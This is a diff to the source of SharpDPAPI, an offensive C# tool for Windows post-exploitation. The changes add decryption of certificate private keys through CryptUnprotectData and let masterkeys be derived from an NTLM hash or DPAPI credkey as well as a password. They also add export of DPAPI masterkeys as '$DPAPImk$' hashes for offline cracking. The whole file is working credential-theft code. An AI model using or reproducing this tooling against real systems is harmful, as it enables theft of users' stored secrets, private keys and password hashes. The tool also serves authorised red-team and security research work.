@@ -2,17 +2,20 @@
 using System;
 using System.Collections;
 using System.Collections.Generic;
+using System.Data.SqlTypes;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Security.Principal;
 using System.Text;
+using System.Text.RegularExpressions;
 
 namespace SharpDPAPI
 {
     public class Dpapi
     {
-        public static Tuple<string, byte[]> DescribeDPAPICertPrivateKey(string fileName, byte[] dpapiblob, Dictionary<string, string> MasterKeys, byte[] entropy = null)
+        public static Tuple<string, byte[]> DescribeDPAPICertPrivateKey(string fileName, byte[] dpapiblob, Dictionary<string, string> MasterKeys, byte[] entropy = null, bool unprotect = false)
         {
             // decrypts the private key part of a CAPI/CNG blog
 
@@ -81,6 +84,31 @@ namespace SharpDPAPI
 
             offset += signBytes.Length + 4;
 
+            if (unprotect)
+            {
+                // use CryptUnprotectData()
+                try
+                {
+                    var decBytes = ProtectedData.Unprotect(dpapiblob, entropy, DataProtectionScope.CurrentUser);
+                    if (decBytes.Length > 0)
+                    {
+                        message += $"\n    Provider GUID    : {strGuidProvider}\n";
+                        message += $"    Master Key GUID  : {strmkguidProvider}\n";
+                        message += $"    Description      : {description}\n";
+                        message += $"    algCrypt         : {(Interop.CryptAlg)algCrypt} (keyLen {algCryptLen})\n";
+                        message += $"    algHash          : {(Interop.CryptAlg)algHash} ({algHash})\n";
+                        message += $"    Salt             : {Helpers.ByteArrayToString(saltBytes)}\n";
+                        message += $"    HMAC             : {Helpers.ByteArrayToString(hmac)}\n";
+                    }
+
+                    return new Tuple<string, byte[]>(message, decBytes);
+                }
+                catch
+                {
+                    Console.WriteLine($"    [!] {fileName} masterkey needed: {strmkguidProvider}");
+                }
+            }
+
             switch (algHash)
             {
                 case 32782:
@@ -101,7 +129,7 @@ namespace SharpDPAPI
                             decrypted = Crypto.DecryptBlob(cipherText, finalKeyBytes, algCrypt);
                         }
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
                         Console.WriteLine($"    [!] {fileName} masterkey needed: {strmkguidProvider}");
                     }
@@ -134,7 +162,7 @@ namespace SharpDPAPI
                             Console.WriteLine("    [X] Error decrypting blob: {0}", ex);
                         }
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
                         Console.WriteLine($"    [!] {fileName} masterkey needed: {strmkguidProvider}");
                     }
@@ -231,7 +259,7 @@ namespace SharpDPAPI
         }
 
 
-        public static Tuple<string, byte[]> DescribeCngCertBlob(string fileName, byte[] blobBytes, Dictionary<string, string> MasterKeys)
+        public static Tuple<string, byte[]> DescribeCngCertBlob(string fileName, byte[] blobBytes, Dictionary<string, string> MasterKeys, bool unprotect = false)
         {
             // Parses a CNG certificate private key blob, decrypting if possible.
 
@@ -271,7 +299,7 @@ namespace SharpDPAPI
             Array.Copy(blobBytes, offset, dpapiblob, 0, dwPrivateKeyLen);
 
             // entropy needed - https://github.com/gentilkiwi/mimikatz/blob/fa42ed93aa4d5aa73825295e2ab757ac96005581/modules/kull_m_key.h#L13
-            Tuple<string, byte[]> result = DescribeDPAPICertPrivateKey(fileName, dpapiblob, MasterKeys, Helpers.Combine(Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA"), new byte[1]));
+            Tuple<string, byte[]> result = DescribeDPAPICertPrivateKey(fileName, dpapiblob, MasterKeys, Helpers.Combine(Encoding.UTF8.GetBytes("xT5rZW5qVVbrvpuA"), new byte[1]),unprotect);
 
             string message = result.First;
             if (result.Second.Length > 0)
@@ -283,7 +311,7 @@ namespace SharpDPAPI
         }
 
 
-        public static Tuple<string, byte[]> DescribeCapiCertBlob(string fileName, byte[] blobBytes, Dictionary<string, string> MasterKeys)
+        public static Tuple<string, byte[]> DescribeCapiCertBlob(string fileName, byte[] blobBytes, Dictionary<string, string> MasterKeys, bool unprotect = false)
         {
             // Parses a CAPI certificate private key blob, decrypting if possible.
 
@@ -369,11 +397,10 @@ namespace SharpDPAPI
                         len = siPrivateKeyLen;
                     }
 
-                    var offset2 = 0;
                     var dpapiblob = new byte[len];
                     Array.Copy(blobBytes, offset, dpapiblob, 0, len);
 
-                    Tuple<string, byte[]> result = DescribeDPAPICertPrivateKey(fileName, dpapiblob, MasterKeys);
+                    Tuple<string, byte[]> result = DescribeDPAPICertPrivateKey(fileName, dpapiblob, MasterKeys, null, unprotect);
                     string message = result.First;
                     if(result.Second.Length > 0)
                     {
@@ -388,18 +415,18 @@ namespace SharpDPAPI
         }
 
 
-        public static ExportedCertificate DescribeCertificate(string fileName, byte[] certificateBytes, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false)
+        public static ExportedCertificate DescribeCertificate(string fileName, byte[] certificateBytes, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false, bool unprotect = false)
         {
             // takes a raw certificate private key blob and decrypts/displays if possible
 
             Tuple<string, byte[]> result = new Tuple<string, byte[]>("", null);
             if (cng)
             {
-                result = DescribeCngCertBlob(fileName, certificateBytes, MasterKeys);
+                result = DescribeCngCertBlob(fileName, certificateBytes, MasterKeys, unprotect);
             }
             else
             {
-                result = DescribeCapiCertBlob(fileName, certificateBytes, MasterKeys);
+                result = DescribeCapiCertBlob(fileName, certificateBytes, MasterKeys, unprotect);
             }
 
             string statusMessage = result.First;
@@ -824,12 +851,12 @@ namespace SharpDPAPI
 
             if (arguments.ContainsKey("/server"))
             {
-                masterkeys = Triage.TriageUserMasterKeys(backupKeyBytes, false, arguments["/server"]);
+                masterkeys = Triage.TriageUserMasterKeys(backupKeyBytes: backupKeyBytes, show: false, computerName: arguments["/server"]);
             }
             else
             {
                 Console.WriteLine("");
-                masterkeys = Triage.TriageUserMasterKeys(backupKeyBytes, false);
+                masterkeys = Triage.TriageUserMasterKeys(backupKeyBytes: backupKeyBytes, show: false);
             }
 
             if (masterkeys.Count == 0)
@@ -1725,9 +1752,18 @@ namespace SharpDPAPI
             return masterKeySubBytes;
         }
         
-        public static byte[] CalculateKeys(string password, string directory, bool domain)
+        public static byte[] CalculateKeys(bool domain = true, string password = "", string ntlm = "", string credkey = "",  string userSID = "", string directory = "")
         {
-            var usersid = Path.GetFileName(directory).TrimEnd(Path.DirectorySeparatorChar);
+            var usersid = "";
+
+            if (!String.IsNullOrEmpty(directory))
+            {
+                usersid = Path.GetFileName(directory).TrimEnd(Path.DirectorySeparatorChar);
+            }
+            else
+            {
+                usersid = userSID;
+            }
 
             var utf16pass = Encoding.Unicode.GetBytes(password);
             var utf16sid = Encoding.Unicode.GetBytes(usersid);
@@ -1736,60 +1772,86 @@ namespace SharpDPAPI
             utf16sid.CopyTo(utf16sidfinal, 0);
             utf16sidfinal[utf16sidfinal.Length - 2] = 0x00;
 
-            byte[] sha1bytes_password;
-            byte[] hmacbytes;
-
             if (!domain)
             {
-                //Calculate SHA1 from user password
-                using (var sha1 = new SHA1Managed())
+                if (!domain && !String.IsNullOrEmpty(credkey))
                 {
-                    sha1bytes_password = sha1.ComputeHash(utf16pass);
+                    // using the local credkey specifically
+                    using (var hmac = new HMACSHA1(Helpers.ConvertHexStringToByteArray(credkey)))
+                    {
+                        return hmac.ComputeHash(utf16sidfinal);
+                    }
                 }
-                var combined = Helpers.Combine(sha1bytes_password, utf16sidfinal);
-                using (var hmac = new HMACSHA1(sha1bytes_password))
+                else
                 {
-                    hmacbytes = hmac.ComputeHash(utf16sidfinal);
+                    // Calculate SHA1 from user password
+                    byte[] sha1bytes_password;
+                    using (var sha1 = new SHA1Managed())
+                    {
+                        sha1bytes_password = sha1.ComputeHash(utf16pass);
+                    }
+                    var combined = Helpers.Combine(sha1bytes_password, utf16sidfinal);
+                    using (var hmac = new HMACSHA1(sha1bytes_password))
+                    {
+                        return hmac.ComputeHash(utf16sidfinal);
+                    }
                 }
-                return hmacbytes;
             }
             else
             {
-                //Calculate NTLM from user password. Kerberos's RC4_HMAC key is the NTLM hash
-                var rc4Hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, password);
-
-                var ntlm = Helpers.ConvertHexStringToByteArray(rc4Hash);
-
-                var combinedNTLM = Helpers.Combine(ntlm, utf16sidfinal);
-                byte[] ntlmhmacbytes;
-
-                //Calculate SHA1 of NTLM from user password
-                using (var hmac = new HMACSHA1(ntlm))
+                if (!String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(ntlm))
                 {
-                    ntlmhmacbytes = hmac.ComputeHash(utf16sidfinal);
+                    byte[] ntlmBytes = null;
+
+                    if (!String.IsNullOrEmpty(password))
+                    {
+                        ntlmBytes = Helpers.ConvertHexStringToByteArray(Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, password));
+                    }
+                    else if (!String.IsNullOrEmpty(ntlm))
+                    {
+                        ntlmBytes = Helpers.ConvertHexStringToByteArray(ntlm);
+                    }
+
+                    var combinedNTLM = Helpers.Combine(ntlmBytes, utf16sidfinal);
+                    byte[] ntlmhmacbytes;
+
+                    using (var hmac = new HMACSHA1(ntlmBytes))
+                    {
+                        ntlmhmacbytes = hmac.ComputeHash(utf16sidfinal);
+                    }
+
+                    byte[] tmpbytes;
+                    byte[] credkey_bytes;
+
+                    using (var hMACSHA256 = new HMACSHA256())
+                    {
+                        var deriveBytes = new Pbkdf2(hMACSHA256, ntlmBytes, utf16sid, 10000);
+                        tmpbytes = deriveBytes.GetBytes(32, "sha256");
+                    }
+
+                    using (var hMACSHA256 = new HMACSHA256())
+                    {
+                        var deriveBytes = new Pbkdf2(hMACSHA256, tmpbytes, utf16sid, 1);
+                        credkey_bytes = deriveBytes.GetBytes(16, "sha256");
+                    }
+
+                    using (var hmac = new HMACSHA1(credkey_bytes))
+                    {
+                        return hmac.ComputeHash(utf16sidfinal);
+                    }
                 }
-
-                byte[] tmpbytes1;
-                byte[] tmpbytes2;
-                byte[] tmpkey3bytes;
-
-                using (var hMACSHA256 = new HMACSHA256())
+                else if (!String.IsNullOrEmpty(credkey))
                 {
-                    var deriveBytes = new Pbkdf2(hMACSHA256, ntlm, utf16sid, 10000);
-                    tmpbytes1 = deriveBytes.GetBytes(32, "sha256");
+                    using (var hmac = new HMACSHA1(Helpers.ConvertHexStringToByteArray(credkey)))
+                    {
+                        return hmac.ComputeHash(utf16sidfinal);
+                    }
                 }
-
-                using (var hMACSHA256 = new HMACSHA256())
+                else
                 {
-                    var deriveBytes = new Pbkdf2(hMACSHA256, tmpbytes1, utf16sid, 1);
-                    tmpbytes2 = deriveBytes.GetBytes(16, "sha256");
+                    Console.WriteLine("  [X] CalculateKeys() error: either a /password, /ntlm, or /credkey must be supplied!");
+                    return null;
                 }
-
-                using (var hmac = new HMACSHA1(tmpbytes2))
-                {
-                    tmpkey3bytes = hmac.ComputeHash(utf16sidfinal);
-                }
-                return tmpkey3bytes;
             }
         }
 
@@ -1882,7 +1944,7 @@ namespace SharpDPAPI
                 // Support for 32777(CALG_HMAC) / 26115(CALG_3DES)
                 case 26115 when (algHash == 32777 || algHash == 32772):
                     {
-                        var masterKeySha1 = DecryptTripleDESHmac(derivedPreKey, encData);
+                        var masterKeySha1 = DecryptTripleDESHmac(shaBytes, derivedPreKey, encData);
                         var masterKeyStr = BitConverter.ToString(masterKeySha1).Replace("-", "");
 
                         return new KeyValuePair<string, string>(guidMasterKey, masterKeyStr);
@@ -1934,8 +1996,7 @@ namespace SharpDPAPI
 
         private static byte[] DecryptAes256HmacSha512(byte[] shaBytes, byte[] final, byte[] encData)
         {
-            var HMACLen = (new HMACSHA512()).HashSize / 8;
-            var aesCryptoProvider = new AesManaged();
+            var aesCryptoProvider = new AesCryptoServiceProvider();
 
             var ivBytes = new byte[16];
             Array.Copy(final, 32, ivBytes, 0, 16);
@@ -1950,46 +2011,21 @@ namespace SharpDPAPI
 
             // decrypt the encrypted data using the Pbkdf2-derived key
             var plaintextBytes = aesCryptoProvider.CreateDecryptor().TransformFinalBlock(encData, 0, encData.Length);
-
-            var outLen = plaintextBytes.Length;
-            var outputLen = outLen - 16 - HMACLen;
-
-            var masterKeyFull = new byte[HMACLen];
-
-            // outLen - outputLen == 80 in this case
-            Array.Copy(plaintextBytes, outLen - outputLen, masterKeyFull, 0, masterKeyFull.Length);
+            var masterKeyFull = new byte[64];
+            Array.Copy(plaintextBytes, plaintextBytes.Length - masterKeyFull.Length, masterKeyFull, 0, masterKeyFull.Length);
 
             using (var sha1 = new SHA1Managed())
             {
                 var masterKeySha1 = sha1.ComputeHash(masterKeyFull);
 
-                // we're HMAC'ing the first 16 bytes of the decrypted buffer with the shaBytes as the key
-                var plaintextCryptBuffer = new byte[16];
-                Array.Copy(plaintextBytes, plaintextCryptBuffer, 16);
-                var hmac1 = new HMACSHA512(shaBytes);
-                var round1Hmac = hmac1.ComputeHash(plaintextCryptBuffer);
+                if (!IsValidHMAC(plaintextBytes, masterKeyFull, shaBytes, typeof(HMACSHA512)))
+                    throw new Exception("HMAC integrity check failed!");
 
-                // round 2
-                var round2buffer = new byte[outputLen];
-                Array.Copy(plaintextBytes, outLen - outputLen, round2buffer, 0, outputLen);
-                var hmac2 = new HMACSHA512(round1Hmac);
-                var round2Hmac = hmac2.ComputeHash(round2buffer);
-
-                // compare the second HMAC value to the original plaintextBytes, starting at index 16
-                var comparison = new byte[64];
-                Array.Copy(plaintextBytes, 16, comparison, 0, comparison.Length);
-
-                if (comparison.SequenceEqual(round2Hmac))
-                {
-                    return masterKeySha1;
-                }
-
-                throw new Exception("HMAC integrity check failed!");
-
+                return masterKeySha1;
             }
         }
 
-        private static byte[] DecryptTripleDESHmac(byte[] final, byte[] encData)
+        private static byte[] DecryptTripleDESHmac(byte[] shaBytes, byte[] final, byte[] encData)
         {
             var desCryptoProvider = new TripleDESCryptoServiceProvider();
 
@@ -2005,14 +2041,163 @@ namespace SharpDPAPI
             desCryptoProvider.Padding = PaddingMode.Zeros;
 
             var plaintextBytes = desCryptoProvider.CreateDecryptor().TransformFinalBlock(encData, 0, encData.Length);
-            var decryptedkey = new byte[64];
+            var masterKeyFull = new byte[64];
+            Array.Copy(plaintextBytes, plaintextBytes.Length - masterKeyFull.Length, masterKeyFull, 0, masterKeyFull.Length);
 
-            Array.Copy(plaintextBytes, 40, decryptedkey, 0, 64);
             using (var sha1 = new SHA1Managed())
             {
-                var masterKeySha1 = sha1.ComputeHash(decryptedkey);
+                var masterKeySha1 = sha1.ComputeHash(masterKeyFull);
+
+                if (!IsValidHMAC(plaintextBytes, masterKeyFull, shaBytes, typeof(HMACSHA1)))
+                    throw new Exception("HMAC integrity check failed!");
+
                 return masterKeySha1;
             }
+        }
+
+        private static bool IsValidHMAC(byte[] plaintextBytes, byte[] masterKeyFull, byte[] shaBytes, Type HMACType)
+        {
+            var obj = (HMAC)Activator.CreateInstance(HMACType);
+            var HMACLen = obj.HashSize / 8;
+
+            // we're HMAC'ing the first 16 bytes of the decrypted buffer with the shaBytes as the key
+            var hmacSalt = new byte[16];
+            Array.Copy(plaintextBytes, hmacSalt, 16);
+
+            var hmac = new byte[HMACLen];
+            Array.Copy(plaintextBytes, 16, hmac, 0, hmac.Length);
+
+            var hmac1 = (HMAC)Activator.CreateInstance(HMACType, shaBytes);
+            var round1Hmac = hmac1.ComputeHash(hmacSalt);
+
+            // round 2
+            var hmac2 = (HMAC)Activator.CreateInstance(HMACType, round1Hmac);
+            var round2Hmac = hmac2.ComputeHash(masterKeyFull);
+
+            // compare the second HMAC value to the original plaintextBytes, starting at index 16
+            if (hmac.SequenceEqual(round2Hmac))
+            {
+                return true;
+            }
+            return false;
+        }
+
+        public static KeyValuePair<string, string> FormatHash(byte[] masterKeyBytes, string sid, int context = 3)
+        {
+            if (string.IsNullOrEmpty(sid) || masterKeyBytes == null)
+                return default;
+
+            var mkBytes = GetMasterKey(masterKeyBytes);
+            var guidMasterKey = $"{{{Encoding.Unicode.GetString(masterKeyBytes, 12, 72)}}}";
+
+            var offset = 4;
+            var salt = new byte[16];
+            Array.Copy(mkBytes, 4, salt, 0, 16);
+            offset += 16;
+
+            var rounds = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var algHash = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var algCrypt = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var encData = new byte[mkBytes.Length - offset];
+            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
+
+            int version = 0;
+            string cipherAlgo;
+            string hmacAlgo;
+
+            switch (algCrypt)
+            {
+                case 26128 when (algHash == 32782 || algHash == 32772):
+                    version = 2;
+                    cipherAlgo = "aes256";
+                    hmacAlgo = "sha512";
+                    break;
+                case 26115 when (algHash == 32777):
+                    version = 1;
+                    cipherAlgo = "des3";
+                    hmacAlgo = "sha1";
+                    break;
+                default:
+                    throw new Exception($"Alg crypt '{algCrypt} / 0x{algCrypt:X8}' not currently supported!");
+            }
+
+            string hash = string.Format(
+                "$DPAPImk${0}*{1}*{2}*{3}*{4}*{5}*{6}*{7}*{8}",
+                version,
+                context,
+                sid,
+                cipherAlgo,
+                hmacAlgo,
+                rounds,
+                Helpers.ByteArrayToString(salt),
+                encData.Length * 2,
+                Helpers.ByteArrayToString(encData));
+
+            return new KeyValuePair<string, string>(guidMasterKey, hash);
+        }
+
+        public static string GetPreferredKey(string file)
+        {
+            byte[] guidBytes = new byte[16];
+            using (BinaryReader reader = new BinaryReader(new FileStream(file, FileMode.Open)))
+            {
+                reader.Read(guidBytes, 0, 16);
+            }
+            return new Guid(guidBytes).ToString();
+        }
+
+        public static string GetSidFromBKFile(string bkFile)
+        {
+            string sid = string.Empty;
+            byte[] bkBytes = File.ReadAllBytes(bkFile);
+
+            if (bkBytes.Length > 28)
+            {
+                try
+                {
+                    SecurityIdentifier sidObj = new SecurityIdentifier(bkBytes, 0x3c);
+                    sid = sidObj.Value;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[X] Failed to parse BK file: {ex.Message}");
+                }
+            }
+            return sid;
+        }
+
+        public static string ExtractSidFromPath(string masterKeyPath)
+        {
+            string sid = String.Empty;
+
+            // First check if there is a BK file we can get the SID from
+            foreach (string file in Directory.GetFiles(Path.GetDirectoryName(masterKeyPath), "*", SearchOption.TopDirectoryOnly))
+            {
+                if (Path.GetFileName(file).StartsWith("BK-"))
+                {
+                    sid = GetSidFromBKFile(file);
+                    if (!String.IsNullOrEmpty(sid))
+                    {
+                        //Console.WriteLine($"[*] Found SID from BK file: {sid}");
+                        break;
+                    }
+                }
+            }
+
+            // Fall back to directory name
+            if (String.IsNullOrEmpty(sid) && Regex.IsMatch(Path.GetDirectoryName(masterKeyPath),
+                @"S-\d-\d+-(\d+-){1,14}\d+$", RegexOptions.IgnoreCase))
+            {
+                sid = Path.GetFileName(Path.GetDirectoryName(masterKeyPath));
+                //Console.WriteLine($"[*] Found SID from path: {sid}");
+            }
+            return sid;
         }
     }
 }
